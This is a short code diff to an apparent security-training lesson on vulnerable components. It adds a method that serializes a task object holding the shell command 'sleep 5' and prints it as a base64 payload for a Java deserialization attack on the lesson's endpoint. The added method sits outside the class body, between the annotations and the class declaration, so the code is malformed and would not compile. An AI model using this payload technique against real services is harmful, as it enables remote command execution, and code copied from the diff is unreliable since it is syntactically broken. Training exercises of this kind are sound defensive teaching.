@@ -34,7 +34,19 @@ import org.springframework.web.bind.annotation.RestController;
 
 @RestController
 @AssignmentHints({"vulnerable.hint"})
+
+public void createPayload() throws Exception {
+VulnerableTaskHolder o = new VulnerableTaskHolder("namenotimportant", "sleep 5");
+ByteArrayOutputStream baos = new ByteArrayOutputStream();
+ObjectOutputStream oos = new ObjectOutputStream(baos);
+oos.writeObject(o);
+oos.close();
+System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
+}
+
+
 public class VulnerableComponentsLesson extends AssignmentEndpoint {
+    
 
   @PostMapping("/VulnerableComponents/attack1")
   public @ResponseBody AttackResult completed(@RequestParam String payload) {
